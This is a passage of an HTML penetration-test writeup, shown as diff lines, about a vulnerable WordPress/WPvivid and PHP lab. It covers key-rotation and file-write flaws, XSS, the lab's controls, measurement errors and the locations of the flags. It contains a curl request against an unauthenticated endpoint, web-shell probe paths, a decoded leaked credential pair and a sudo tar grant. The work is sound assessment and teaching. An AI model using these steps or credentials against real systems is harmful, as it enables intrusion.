+<h3 id="f4--wpvivids-site-api-keypair-lives-in-wp_options-in-plaintext-and-it-is-the-sole-gate-on-an-unauthenticated-file-write-primitive">F4 — WPvivid's site API keypair lives in <code>wp_options</code> in plaintext, and it is the sole gate on an unauthenticated file-write primitive</h3>
+<p><strong>CWE-312 (cleartext storage of sensitive information) / CWE-922 (insecure storage of credentials) · High</strong></p>
+<p>The plugin stores an <strong>RSA-2048 keypair, base64-encoded, in the options table</strong>, and the
+private half is what decrypts every inbound transfer:</p>
+<pre><code class="language-php">// includes/customclass/class-wpvivid-send-to-site.php:596-601  (and :705-716, :952-960)
+$option = get_option('wpvivid_api_token', $default);
+if (empty($option)) { die(); }
+if ($option['expires'] != 0 &amp;&amp; $option['expires'] &lt; time()) { die(); }
+$crypt = new WPvivid_crypt(base64_decode($option['private_key']));
+$body  = base64_decode($_POST['wpvivid_content']);
+$data  = $crypt-&gt;decrypt_message($body);
+</code></pre>
+<p>And the <strong>dispatcher for that primitive has no authorisation at all</strong> — it runs on
+<code>plugins_loaded</code> for any POST to any page on the site:</p>
+<pre><code class="language-php">// includes/customclass/class-wpvivid-send-to-site.php:37-62
+public function plugins_loaded() {
+    if (!empty($_POST) &amp;&amp; isset($_POST['wpvivid_action'])) {
+        if      ($_POST['wpvivid_action']=='send_to_site_connect') { $this-&gt;send_to_site_connect(); }
+        else if ($_POST['wpvivid_action']=='send_to_site_finish')  { $this-&gt;send_to_site_finish(); }
+        else if ($_POST['wpvivid_action']=='send_to_site')         { $this-&gt;send_to_site(); }
+        else if ($_POST['wpvivid_action']=='send_to_site_file_status') { $this-&gt;send_to_site_file_status(); }
+        else if ($_POST['wpvivid_action']=='clear_backup_cache')   { $this-&gt;clear_backup_cache(); }
+        die();
+    }
+}
+</code></pre>
+<p>No <code>current_user_can</code>, no nonce, no <code>check_ajax_referer</code>, no rate limit. <code>send_to_site()</code>
+then writes attacker-chosen bytes at an attacker-chosen <code>$params['offset']</code> into
+<code>WP_CONTENT_DIR/&lt;backupdir&gt;/&lt;$params['name']&gt;</code> — and <code>wp-content/uploads</code> is executable
+here, so a <code>.php</code> <code>name</code> is code execution as <code>www-data</code>.</p>
+<p><strong>The design error is that the only thing standing between the open door and the file write is
+a secret that is (i) stored in plaintext in the database, (ii) used as a <em>shared</em> symmetric
+envelope key for an <em>asymmetric</em> channel, and (iii) rotatable by anyone (F5).</strong> No
+authentication, no replay window, no per-request nonce, no origin binding, no rate limit on
+failed decryptions — a ciphertext oracle with no throttle.</p>
+<p><strong>Impact.</strong> Anyone who obtains the keypair — by F3, by any SQL read, by any file read of
+<code>wp_options</code>, or by the migration-URL disclosure in F6 — writes arbitrary bytes anywhere under
+<code>wp-content</code> as an unauthenticated client, and the tree executes them. The lab's own build-time
+access log shows the author walking straight into this door and probing
+<code>wp-content/uploads/*.php?cmd=id</code> (§7, D7).</p>
+<p><strong>Remediation.</strong> The dispatcher must require <code>current_user_can('manage_options')</code> and a
+<code>check_ajax_referer()</code>; the transfer envelope needs a per-transfer nonce, a recipient-bound
+timestamp and a single-use record, so a captured ciphertext cannot be replayed; and the
+asymmetric key must never be used as a bulk symmetric envelope key.</p>
+<h3 id="f5--generate_keyphp-lets-any-unauthenticated-client-rotate-the-sites-api-keypair">F5 — <code>generate_key.php</code> lets any unauthenticated client rotate the site's API keypair</h3>
+<p><strong>CWE-306 (missing authentication for critical function) / CWE-652 · Medium–High</strong></p>
+<pre><code class="language-php">// /var/www/html/secret_portal_65hBlEo9OU/generate_key.php:1-14  — mode 0644 root:root, in the docroot
+require_once(&quot;wp-load.php&quot;);
+include_once WPVIVID_PLUGIN_DIR . '/vendor/autoload.php';
+$rsa = new Crypt_RSA();
+$keys = $rsa-&gt;createKey(2048);
+$options['public_key']  = base64_encode($keys['publickey']);
+$options['private_key'] = base64_encode($keys['privatekey']);
+$options['expires'] = time() + 86400;
+$options['domain']   = home_url();
+update_option('wpvivid_api_token', $options);
+echo &quot;Token generado y guardado en wp_options correctamente.\n&quot;;
+</code></pre>
+<p><strong>Proven by the artefact, not by the status code.</strong> One anonymous <code>GET</code>, and the stored option
+changes:</p>
+<pre><code>BEFORE md5(option_value) = ae86ba2e209553adaa280eb777afa9f3
+$ curl -sS -i http://[net-0-5]/secret_portal_65hBlEo9OU/generate_key.php
+HTTP/1.1 200 OK
+Content-Length: 55
+Token generado y guardado en wp_options correctamente.
+AFTER  md5(option_value) = 2bcb520bc14d8989133116bd7778c294
+$ …decode the new value…
+public_key  -&gt; -----BEGIN PUBLIC KEY-----
+private_key -&gt; -----BEGIN RSA PRIVATE KEY-----
+</code></pre>
+<p>And after <code>docker rm -f</code> + <code>docker run</code> from the image, the <strong>shipped</strong> value hashes to
+<code>4c180c17019efed1ea607839d67b418b</code> — a <strong>third</strong> distinct value, which is the cleanest possible
+demonstration that the rotation happened and was undone by the restore.</p>
+<p><strong>Impact.</strong> Two things, and the first is the finding rather than the second:</p>
+<ol>
+<li><strong>Unauthenticated destructive write to a security-critical option.</strong> Any anonymous client
+can permanently invalidate the site's configured remote backup/migration peer, and there is
+no recovery path short of an administrator. That is a denial of service on a data-protection
+feature, from a URL that ships in the image.</li>
+<li><strong>A rotate primitive with no read primitive is still a read primitive for whoever rotates
+last.</strong> An attacker who can reach the database — by F3 or F2 — rotates the key and then
+owns a keypair the legitimate operator has never seen, which is the precondition for F4.
+The reverse ordering is the danger: the <em>last</em> writer of <code>wpvivid_api_token</code> is the only
+party who can use the write primitive.</li>
+</ol>
+<p><strong>Remediation.</strong> Delete <code>generate_key.php</code> from the shipped image — it is a setup script that
+was never meant to be web-reachable, and it has no authentication of any kind. Key management
+belongs in a CLI-only path (<code>wp-cli</code> over a real shell) or in a settings screen behind
+<code>manage_options</code> and a nonce, with the previous key retained and honoured until its own
+expiry. <code>generate_migration_key.php</code> (500, <code>WPvivid_Crypt class not found</code>) is the same class
+of leftover and should go with it.</p>
+<h3 id="f6--the-accounts-email-address-is-collected-never-verified-never-used-and-is-not-a-key">F6 — The account's email address is collected, never verified, never used, and is not a key</h3>
+<p><strong>CWE-620 (unverified password change) → CWE-287 (improper authentication) · Medium</strong></p>
+<p><code>register.php</code> takes an <code>email</code> and a <code>phone</code> and stores both. <strong>No code anywhere reads them
+again</strong>, and there is no email-confirmation step of any kind — the lifecycle jumps straight
+from &quot;row exists&quot; to &quot;SMS code matched&quot;, skipping the ownership proof that the <code>email</code> field
+exists to provide. Meanwhile <code>users</code> has a UNIQUE key on <code>username</code> and <strong>none on <code>email</code></strong>:</p>
+<pre><code>$ register e1&lt;t&gt; with email shared-&lt;t&gt;@example.invalid  -&gt; 302 verify.php
+$ register e2&lt;t&gt; with the SAME email                    -&gt; 302 verify.php
+$ select group_concat(username) from users where email='shared-&lt;t&gt;@example.invalid'
+e1&lt;t&gt;,e2&lt;t&gt;            &lt;- two accounts, one address, no complaint
+</code></pre>
+<p>Contrast that with <code>username</code>, which <em>is</em> a key and which the application defends properly in
+all three spellings (§10, C2). <strong>So the identifier the application chose to enforce is the one
+the user invents, and the identifier it chose to trust is the one it never checks.</strong> That
+inversion is the finding; the missing unique index is a consequence.</p>
+<p><strong>Impact.</strong> No direct takeover — nothing in the app acts on the email. The impact is
+compositional and it is the reason the account list here is worthless as an attribution
+boundary: the address a person is expected to prove ownership of is decorative, so two accounts
+can present the same claimed identity, and any <em>future</em> feature that trusts it (password reset,
+notifications, account recovery, an audit trail) inherits an unauthenticated assumption. Note
+the WordPress half of the lab has the same shape for the same reason: <code>admin@example.local</code> is
+unroutable, and there is no mailer, so WordPress's own <code>lostpassword</code> and <code>confirm_admin_email</code>
+transitions <strong>generate keys that cannot be delivered either</strong> — the same defect, in the
+platform's own account lifecycle, for the same reason.</p>
+<p><strong>Remediation.</strong> Either verify the address (send a link, store its state, and gate the
+&quot;confirmed&quot; transition on it) or stop collecting it. Add <code>UNIQUE</code> on a normalised address, and
+treat &quot;an address already on file&quot; as a <em>distinct</em> outcome from &quot;a username already on file&quot; —
+the two need different messages for different reasons, and collapsing them into one
+<code>PDOException</code> (<code>register.php:22-24</code>) is why neither one gets a correct answer.</p>
+<h3 id="f7--verifyphps-expiry-path-deletes-the-account-row-keyed-on-a-session-supplied-username">F7 — <code>verify.php</code>'s expiry path deletes the account row, keyed on a session-supplied username</h3>
+<p><strong>CWE-613 (insufficient session expiration) / CWE-20 (improper input validation) · Low–Medium, and it is a design smell worth naming</strong></p>
+<pre><code class="language-php">// verify.php:15-20
+if (!$verification || time() &gt; $verification['expires_at']) {
+    $pdo-&gt;prepare('DELETE FROM users WHERE username = ?')-&gt;execute([$username]);
+    $pdo-&gt;prepare('DELETE FROM verifications WHERE username = ?')-&gt;execute([$username]);
+    unset($_SESSION['verify_user']);
+    die(&quot;…El código SMS ha expirado. Tu cuenta temporal ha sido eliminada.…&quot;);
+}
+</code></pre>
+<p>The <code>!$verification</code> branch means: <strong>any request that reaches <code>verify.php</code> with a
+<code>$_SESSION['verify_user']</code> naming an account that has no outstanding token deletes that
+account.</strong> The username comes from the session, and the session's only gate is that
+<code>register.php</code> set it — so today the blast radius is &quot;accounts you registered yourself&quot;,
+because <code>ctf_db</code> ships empty. I did <strong>not</strong> demonstrate cross-account deletion (§11, D3), and
+I am not claiming it. What makes it a finding rather than a note is the shape: a
+<em>read-path</em> branch performing an unconditional <strong><code>DELETE</code></strong>, with the same <code>$username</code> string
+that the whole lifecycle keys on, and with the error text advertising the deletion to whoever
+triggered it.</p>
+<p><strong>Remediation.</strong> Garbage-collect abandoned registrations with a scheduled job keyed on
+<code>users.created_at &lt; now() - interval</code>, not from a request handler. A cleanup path should not be
+reachable by naming a row, and it should never be the same code path that renders a message.</p>
+<h3 id="f8--reflected-xss-in-the-login-pages-msg-parameter-correctly-encoded-correctly-reported">F8 — Reflected XSS in the login page's <code>msg</code> parameter, correctly encoded, correctly reported</h3>
+<p><strong>CWE-79 · Low (reported because the corpus asked, and because the encoding is the point)</strong></p>
+<pre><code class="language-php">// index.php:26
+&lt;?php if(isset($_GET['msg'])) echo &quot;&lt;p style='color:green'&gt;&quot; . htmlspecialchars($_GET['msg']) . &quot;&lt;/p&gt;&quot;; ?&gt;
+</code></pre>
+<p><code>htmlspecialchars()</code> with no <code>ENT_QUOTES</code> and no <code>charset</code> — the two omissions that matter in
+modern PHP are irrelevant here because the element is an HTML text node. I verified the
+encoding works: the reflection is inert. This is filed <strong>Low</strong> and explicitly <strong>not</strong> chained,
+because there is no victim in a lab and the skill's own output contract asks for a separate
+<code>unverified_leads[]</code> rather than an inflated severity. It is worth one line here for a different
+reason: the <em>other</em> echo on the same page interpolates a variable (<code>index.php:27</code>,
+<code>echo &quot;&lt;p style='color:red'&gt;$error&lt;/p&gt;&quot;</code>) without <code>htmlspecialchars()</code>. That one is
+server-generated and I could not reach it with attacker bytes — but it is the line that will
+become exploitable the first time anyone puts a request value into <code>$error</code>, and the encoding
+discipline of <code>:26</code> will not be copied there automatically.</p>
+<hr />
+<h2 id="5-the-wordpress-half-what-is-there-and-what-the-artefacts-say-about-it">5. The WordPress half: what is there, and what the artefacts say about it</h2>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Value</th>
+<th>Sources that agree</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>WordPress core</td>
+<td><strong>6.9.1</strong></td>
+<td><code>wp-includes/version.php:19</code> read from the <strong>image</strong> with <code>--entrypoint sh</code>; the running container; <code>readme.html</code></td>
+</tr>
+<tr>
+<td>Plugin</td>
+<td><code>wpvivid-backuprestore</code> <strong>0.9.123</strong></td>
+<td><code>wpvivid-backuprestore.php</code> header; <code>readme.txt</code> <code>Stable tag: 0.9.123</code>; <code>wp_options.active_plugins</code></td>
+</tr>
+<tr>
+<td>Other plugins</td>
+<td><code>akismet</code>, <code>hello.php</code> — <strong>present, not active</strong></td>
+<td><code>active_plugins</code> holds exactly one entry</td>
+</tr>
+<tr>
+<td>Theme</td>
+<td><code>twentytwentyfive</code> active (three present)</td>
+<td><code>wp_options.template</code> / <code>stylesheet</code></td>
+</tr>
+<tr>
+<td>Users</td>
+<td><strong>one</strong>: <code>admin_master</code> / <code>admin@example.local</code>, <code>wp_capabilities = a:1:{s:13:&quot;administrator&quot;;b:1;}</code></td>
+<td><code>wp_users</code> + <code>wp_usermeta</code></td>
+</tr>
+<tr>
+<td><code>users_can_register</code></td>
+<td><code>0</code></td>
+<td><code>wp_options</code> — <strong>the custom app is the only registration path in the lab</strong></td>
+</tr>
+<tr>
+<td>DB</td>
+<td><code>wp_db</code> / <code>wp_user</code>, <code>127.0.0.1</code></td>
+<td><code>wp-config.php</code></td>
+</tr>
+<tr>
+<td>Salts</td>
+<td>all eight = <code>'put your unique phrase here'</code></td>
+<td><code>wp-config.php:51-58</code> — <strong>discarded by core</strong>, see C7</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The version did not move under me, and the reason is worth one line</strong> because lab 108 lost
+its headline to it. I pinned <code>6.9.1</code> from the image <em>before</em> the first request
+(<code>docker run --rm --entrypoint sh cuentaatras:latest -c 'grep -n &quot;wp_version =&quot; …'</code>) and
+re-read it from the live container after the engagement: <code>6.9.1</code> both times. This image sets no
+<code>AUTOMATIC_UPDATER_DISABLED</code> and the container <strong>does</strong> have egress, so the exposure is the same
+as lab 108's — it simply did not fire, because <code>wp-cron.php</code> only runs on a front-end request
+and this WordPress has 1 post and no traffic. <strong>Treat that as &quot;has not happened yet&quot;, not as
+&quot;cannot happen&quot;.</strong> A re-run with any traffic at all may pin a different number.</p>
+<p><strong><code>siteurl</code> points at an address that is not this container</strong> (F9 below), which is the shipped
+form of lab 108's <code>WP_HOME</code> trap and it has a concrete consequence: core's fatal-error loopback
+(<code>wp-admin/plugin-editor.php</code> / <code>theme-editor.php</code>, which write, re-request the file over HTTP
+and <strong>revert on failure</strong>) cannot complete, so <strong>the plugin and theme editors are inert here and
+return HTTP 200 while silently reverting</strong> — lab 61's F1 verbatim. I did not exercise the
+editors, so this is read from the configuration and reported as such, not as a measurement.</p>
+<hr />
+<h2 id="6-controls-that-held">6. Controls that held</h2>
+<p>Every row has a positive control: a case where the same detector was <strong>shown firing</strong>.</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Control</th>
+<th>Positive control that proves this detector works</th>
+<th>Negative evidence, with work count</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>C1</td>
+<td>The <code>is_verified</code> gate refuses an unconfirmed account</td>
+<td>a <strong>guessed-correct</strong> code → <code>302 → index.php?msg=Registrado correctamente…</code> and <code>is_verified=1</code> — the transition really does commit</td>
+<td>right password + <code>is_verified=0</code> → <code>200</code>, no <code>Location</code>, body <code>&quot;Cuenta no verificada. Por favor, regístrate de nuevo y completa la verificación SMS.&quot;</code>; a wrong password → <code>200</code> + <code>&quot;Credenciales incorrectas.&quot;</code> Two byte-distinct failures</td>
+</tr>
+<tr>
+<td>C2</td>
+<td><code>username</code> is a real key; the token cannot be stolen by re-registration</td>
+<td>a <em>different</em> username with the same address → <code>302 verify.php</code> (accepted), so the check discriminates</td>
+<td>the same username three ways — identical, <code>UPPERCASE</code> (the column is <code>utf8mb4_general_ci</code>), and with a <strong>trailing space</strong> (MySQL VARCHAR comparison) — all three → <code>200</code> + <code>&quot;El usuario ya existe o hubo un error.&quot;</code>, and <code>count(*) from verifications</code> for that username stayed at <strong>1</strong>. 3 tests</td>
+</tr>
+<tr>
+<td>C3</td>
+<td><code>verify.php</code> requires a session</td>
+<td>a correct code <strong>with</strong> the session → <code>302 → index.php?msg=…</code></td>
+<td>a correct code <strong>without</strong> the cookie → <code>302 → register.php</code>, and the DB row was untouched (<code>is_verified=0</code>, token still present). The two outcomes are byte-distinguishable <em>because the Location differs</em> — which is the whole reason the account-lifecycle flow needs raw hop capture</td>
+</tr>
+<tr>
+<td>C4</td>
+<td>The session liveness probe is a real probe</td>
+<td><code>GET /verify.php</code> with the session → <code>200</code>, <code>timeLeft = 300</code> parsed out of the body</td>
+<td>the same GET without the cookie → <code>302 → register.php</code>, 0 bytes. The probe <strong>asserts on a value read back from the response</strong>, so a dead probe cannot masquerade as a live one</td>
+</tr>
+<tr>
+<td>C5</td>
+<td>WPvivid's AJAX surface is authorised</td>
+<td>a <strong>real</strong> nopriv action with the <em>same wrong</em> nonce — <code>action=heartbeat</code> → <code>200</code>, 48 B, <code>{&quot;wp-auth-check&quot;:false,…}</code> (<code>md5=69adb6329ae8</code>). A wrong nonce is therefore <strong>not</strong> what produces the refusal</td>
+<td>4 actions × 2 variants (no nonce / forged user-0 nonce) — <code>wpvivid_get_setting</code>, <code>wpvivid_get_general_setting</code>, <code>wpvivid_export_setting</code>, <code>wpvivid_download_backup</code> — <strong>all eight</strong> returned <code>400</code>, <strong>1 byte</strong>, body <code>0</code>, <code>md5=cfcd208495d5</code>, <strong>byte-identical</strong>. 8 tests + 4 controls</td>
+</tr>
+<tr>
+<td>C6</td>
+<td>The <code>send_to_site</code> write primitive is not open</td>
+<td>the <code>plugins_loaded</code> dispatcher is reached by <em>any</em> POST with <code>wpvivid_action</code> set — I confirmed the code path exists and that the lab author's own build-time log drives it</td>
+<td>the write itself is gated on <code>get_option('wpvivid_api_token')</code> being non-empty and unexpired (<code>send-to-site.php:597-601</code>), and the key exists only in <code>wp_options</code>, which I could not read. <strong>The gate held against me.</strong> Not tested: whether a forged ciphertext is accepted once the key is known (§11)</td>
+</tr>
+<tr>
+<td>C7</td>
+<td>The salt trap still holds (labs 61/108 §C12, §3.3)</td>
+<td><code>wp-config.php:51-58</code> are all <code>'put your unique phrase here'</code> (lines 10–17 are the file's docblock)</td>
+<td>core discards the placeholder and uses <code>wp_options</code> (<code>pluggable.php:2614/2638</code>); I did not attempt a forgery and <strong>do not claim</strong> these cookies are forgeable</td>
+</tr>
+<tr>
+<td>C8</td>
+<td>The <code>wp_ajax_nopriv_*</code> restore endpoints are not a bypass</td>
+<td>—</td>
+<td>four handlers are registered for logged-out clients (<code>class-wpvivid-restore2.php:21-31</code>: <code>wpvivid_do_restore_2</code>, <code>wpvivid_get_restore_progress_2</code>, <code>wpvivid_finish_restore_2</code>, <code>wpvivid_restore_failed_2</code>) but each body opens with <code>check_ajax_referer('wpvivid_ajax','nonce')</code> <strong>and</strong> <code>current_user_can('manage_options')</code> — e.g. <code>do_restore()</code> at <code>:604-611</code>. Registration order in the constructor is a decoy; the body is the control</td>
+</tr>
+<tr>
+<td>C9</td>
+<td>The privilege ladder is <em>capability</em>-sound, and that is not the same as reachable</td>
+<td><code>sudo -u webmaster sudo -n /usr/bin/tar --version</code> → <code>tar (GNU tar) 1.35</code>. <strong>The rung works.</strong></td>
+<td><code>sudo -l -U www-data</code> → <em>&quot;not allowed to run sudo&quot;</em>; likewise for <code>ethan</code> and <code>bond</code>. <code>find / -xdev -user webmaster</code> → <strong>0 files</strong>. So unlike lab 61's F5 (a ladder with a missing first rung), this ladder is intact and has <strong>no first rung at all</strong></td>
+</tr>
+<tr>
+<td>C10</td>
+<td>The web surface has no privilege delta</td>
+<td>Apache children: <code>Uid: 33 33 33 33</code> — real <strong>and</strong> effective <strong>and</strong> saved <strong>and</strong> fs all 33</td>
+<td>the master is <code>Uid: 0 0 0 0</code> (pid 33), which is why <code>docker exec</code> measurements are privileged instrumentation and are labelled as such everywhere in this writeup</td>
+</tr>
+<tr>
+<td>C11</td>
+<td>No reward is reachable from the web identity</td>
+<td><code>cat /root/root.txt</code> as uid 33 → <code>Permission denied</code>; as uid 1001 → <code>Permission denied</code> (<code>/root</code> is <code>0700</code>)</td>
+<td><code>cat [lab-home]/bond/user.txt</code> as uid 1003 (<code>bond</code>) → the flag; as uid 1002 (<code>ethan</code>) → <code>Permission denied</code>. The <code>0700</code> and the <code>0750</code> are the controls, and both were <strong>fired</strong></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="7-instrumentation-defects">7. Instrumentation defects</h2>
+<p>Seven. None is a defect in the target; all are defects in how I measured it, and <strong>three of
+them nearly became findings</strong>. Read against the 19-entry catalogue in
+<a href="../corrections.html"><code>method/self-corrections.md</code></a> — this is the first corpus entry
+to hit #1 (redirect-following) on a state machine and the first to hit #9
+(<code>permission_callback</code>-before-argument-validation) in its <strong>admin-ajax</strong> rather than its REST
+incarnation.</p>
+<p><strong>7.1 A <code>400</code> from <code>admin-ajax.php</code> is the AJAX twin of <code>rest_missing_callback_param</code>, and it
+told me nothing for four actions.</strong> Catalogue #9 says WordPress validates required parameters
+<em>before</em> <code>permission_callback</code>, so a 400 is evidence of a missing argument and never of a
+reachable route. The same ordering exists in <code>admin-ajax.php</code>: <code>check_ajax_referer()</code> runs
+first, so <strong>every</strong> refusal looks identical. My first pass recorded &quot;4 wpvivid actions refused
+unauthenticated&quot; from the status code alone, which was a guess dressed as a measurement. The
+discriminator is the <strong>body</strong>, and it needed a control that a wrong nonce does <em>not</em> produce:</p>
+<pre><code>wpvivid_get_setting      no nonce      400  1 B  md5=cfcd208495d5
+wpvivid_get_setting      forged nonce  400  1 B  md5=cfcd208495d5     &lt;- identical
+wpvivid_get_setting      heartbeat     200 48 B  md5=69adb6329ae8     &lt;- the control
+</code></pre>
+<p><em>Rule: for an authorisation test on <code>admin-ajax.php</code>, the status code is not a verdict. Run a
+real nopriv action with the same bad credential first; if it does not return the same bytes,
+your detector works and the refusal is real.</em></p>
+<p><strong>7.2 <code>curl -b jar</code> without <code>-c jar</code> — the brief's own warning, and it cost me one false
+negative shaped exactly like a failed exploit.</strong> My positive control for F1 returned
+<code>302 → register.php</code> with a <strong>new</strong> <code>[response-cookie-header]: PHPSESSID=…</code> and the account still
+<code>is_verified=0</code>. The status code is the <em>same</em> one the session-missing case returns, so a
+status-only read would have filed &quot;the confirmation flow is broken&quot;. What saved it was that I
+checked the <strong>artefact</strong> (<code>is_verified</code> in the table) rather than the status — and the artefact
+said the transition had not happened, so the instrument was the suspect. Both <code>-b</code> alone and
+<code>-b</code> + <code>-c</code> were then run against a fresh account and <strong>both</strong> produced the correct
+<code>302 → index.php?msg=…</code> (C1), which located the fault in the earlier call, not in the server.
+<em>Rule: on a state machine, the status code of a transition is not its outcome. The committed
+state is.</em></p>
+<p><strong>7.3 The state file I used to name a variable did not set it — and the failure was silent and
+plausible.</strong> I wrote <code>echo &quot;user=$U&quot; &gt; vars.env</code> in one shell and <code>source vars.env</code> in the next,
+expecting <code>$U</code>; I got an empty <code>$U</code>, an empty jar name, no cookie, and a <code>302 → register.php</code>
+that read exactly like the server refusing the session. Two different defects (the missing <code>-c</code>,
+and this) produced <strong>one</strong> indistinguishable symptom, which is the real lesson: a
+cross-invocation shell variable is an instrument with no work count. Caught by asserting
+<code>SID=&lt;non-empty&gt;</code> and exiting the harness when the jar had no <code>PHPSESSID</code> — after which the
+harness refused to run rather than report a zero. <em>Rule: a harness that cannot find its own
+credential must abort, not proceed; &quot;untested&quot; and &quot;refused&quot; are the only two honest outcomes.</em></p>
+<p><strong>7.4 My own recon sweep destroyed the evidence for the finding it discovered.</strong>
+<code>generate_key.php</code> is a <code>GET</code>. My unauthenticated surface sweep (§1.2) hit it before I knew it
+was state-changing, and it had already rotated <code>wpvivid_api_token</code> to <code>ae86ba2e…</code> before I took
+the &quot;before&quot; reading. F5 would have been unprovable as written if I had not had a third data
+point: the restore from the image produced <code>4c180c17…</code>, so the shipped value, my recon's value
+and my deliberate test's value (<code>2bcb520b…</code>) are <strong>three distinct hashes</strong> and the rotation is
+demonstrated without needing the original. I got lucky. <em>Rule: a recon sweep over a list of
+paths is a set of state-changing requests until proven otherwise — <code>HEAD</code> first, or read the
+handler before requesting it. This is lab 61's §13.2 lesson arriving through a different door:
+the status code of my sweep was <code>200</code> and it changed the target.</em></p>
+<p><strong>7.5 <code>php -i</code> on the CLI reported the session configuration, and I nearly filed it as the
+Apache configuration.</strong> <code>session.upload_progress.enabled =&gt; On</code>, <code>cleanup =&gt; On</code>,
+<code>session.use_strict_mode =&gt; Off</code>, <code>save_path =&gt; /var/lib/php/sessions</code> — all read from
+<code>php -i</code> <strong>on the command line</strong>. The Apache SAPI reads
+<code>/etc/php/8.3/apache2/php.ini</code>, which is a different file. I re-read all four values from the
+Apache SAPI before relying on them (§11, D3), and the one that decided the outcome —
+<code>upload_progress.cleanup</code> — had to be confirmed there.</p>
+<p><strong>7.6 <code>cat</code>-ing &quot;the entrypoint&quot; printed 4.4 MB of <code>wp-cli.phar</code> into my transcript.</strong> I ran
+<code>cat /usr/local/bin/*</code> while looking for the image's start script, and the wrapper
+(<code>#!/usr/bin/env php</code> + <code>Phar::mapPhar()</code>) is a PHP <strong>phar</strong>, so <code>cat</code> produced a wall of
+compressed bytes with a few readable strings in it. Nothing was misread, but the tool was the
+wrong question: the container's real entrypoint was in the <code>docker inspect</code> config and in
+<code>auto_deploy.sh</code>, both of which I had already read. <em>Rule: identify a file before you print it
+(<code>file</code>, <code>head -c</code>, first line). <code>cat</code> on a binary is not reconnaissance.</em></p>
+<p><strong>7.7 The corpus's own warning about a stray HTTP request file applies to this lab's tree.</strong>
+<code>/var/www/html/copy2321_.php</code> is <strong>not PHP</strong> — it is a raw captured request, 10 lines, with no
+<code>&lt;?php</code> tag, so Apache serves it as text. It contains
+<code>Cookie: session_id=ZXRoYW46cGZMbVdWejJFR0tHcFJDbUFDVFAK</code>, which base64-decodes to
+<code>ethan:pfLmWVz2EGKGpRCmACTP</code> — a name/secret pair for a persona belonging to a <em>different</em>
+lab in this series (<code>Host: localhost:8080</code>, <code>GET /productos/lista</code>). I did not use it and did
+not attempt it as a credential. It is reported because a file in a document root whose name ends
+in <code>.php</code> and whose content is not PHP is exactly the artefact a tester will <code>curl</code> and then
+<code>source</code>-interpret, and because the corpus has already been bitten twice by a value that
+looked like a token and belonged to nothing here.</p>
+<p><strong>7.8 The build-time access log is the single most useful reconnaissance artefact in this lab,
+and it is a liability if you read it as a result.</strong> <code>/var/log/apache2/access.log</code> is 33 MB and
+144 976 lines, of which ~123 000 predate my engagement (dated <code>2026-03-01</code>) and record <strong>the
+lab author's own pentest</strong>. It is the reason I know the intended path, and it is also the
+reason a careless writeup would report someone else's 404s as my findings. I used it for
+exactly three things: (i) confirming that registration + <code>verify.php</code> brute force is the
+designed route — <strong>17 419 POSTs at build time, ~6 <code>verify.php</code> attempts per second at
+<code>15:13:58–15:14:01</code></strong>; (ii) confirming the author <strong>never</strong> reached <code>wp-login.php</code> with valid
+credentials (108 <code>wp-login</code> hits, all WPScan, all <code>200</code>/2541 B = failed); and (iii) seeing that
+the author <em>also</em> stalled at the same wpvivid door, probing
+<code>wp-content/uploads/{pwn_remote,exploit,txdiki8k16gp5wjbjcgnu9on}.php?cmd=id</code> and
+<code>{h18fv3j7ozwe,fthy9ktwkxoh,0ieemgucb6pb}.txt</code> — <strong>every one a 404</strong>. That is not evidence
+about the target; it is evidence about the author's run, and I have kept the two apart
+throughout.</p>
+<hr />
+<h2 id="8-reward">8. Reward</h2>
+<p><strong>Two rewards exist in this lab, and neither was obtained by the chain.</strong> Both are reported as
+a measured presence with the search that established it, and both are marked with the identity
+that can read them.</p>
+<pre><code>$ grep -rIl -E &quot;DL\{|FLAG\{|flag\{&quot; / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev
+/root/root.txt
+[lab-home]/bond/user.txt
+
+$ stat -c '%n mode=%a owner=%U(%u)'
+/root              mode=700 owner=root(0)
+/root/root.txt     mode=600 owner=root(0)        -&gt; DL{U31jcT3PzQGbsni7igEf}   [root only]
+[lab-home]/bond         mode=750 owner=bond(1003)     [group = bond only]
+[lab-home]/bond/user.txt mode=644 owner=ethan(1002)   -&gt; DL{oDMEsGfekTxXB2KefL0v}     [bond only]
+</code></pre>
+<p><code>DL{…}</code> values are truncated here; the full values are in those two files.</p>
+<p><strong>The inverted ownership is deliberate and is itself worth a line:</strong> <code>[lab-home]/bond/user.txt</code> is
+<strong>owned by <code>ethan</code></strong>, mode <code>0644</code>, inside a directory <code>0750 bond:bond</code>. So the file's <em>owner</em>
+cannot read it, the directory's <em>group</em> cannot traverse into it, and only <code>bond</code> (or root) can.
+Anyone reasoning from <code>ls -l</code> alone will conclude the wrong thing in both directions.</p>
+<p><strong>Why neither is reachable from the web surface — a measured statement, not an estimate:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Requirement</th>
+<th>Measured</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>the web tier's identity</td>
+<td><code>Uid: 33 33 33 33</code> — <code>www-data</code>, no delta (C10)</td>
+</tr>
+<tr>
+<td><code>www-data</code> can read <code>/root/root.txt</code></td>
+<td><code>Permission denied</code> (C11)</td>
+</tr>
+<tr>
+<td><code>www-data</code> can read <code>[lab-home]/bond/user.txt</code></td>
+<td><code>Permission denied</code> — <code>[lab-home]/bond</code> is <code>0750 bond:bond</code> (C11)</td>
+</tr>
+<tr>
+<td>a sudo grant that would change that</td>
+<td><code>sudo -l -U www-data</code> → <em>not allowed</em>; <code>-U ethan</code> → <em>not allowed</em>; <code>-U bond</code> → <em>not allowed</em> (C9)</td>
+</tr>
+<tr>
+<td>the one sudo grant on the host</td>
+<td><code>webmaster ALL=(ALL) NOPASSWD: /usr/bin/tar</code> — <strong>functional</strong> (C9) and <strong>unreachable</strong>: <code>webmaster</code> owns <strong>0</strong> files on the filesystem and has <strong>no</strong> <code>[lab-home]/webmaster</code></td>
+</tr>
+<tr>
+<td>a second <code>sudo</code> grant</td>
+<td><code>ubuntu ALL=(ALL:ALL) ALL</code> — <strong>but</strong> <code>ubuntu:!</code> in <code>/etc/shadow</code> is a <strong>locked</strong> password, so the account cannot log in at all</td>
+</tr>
+<tr>
+<td>SSH reachability</td>
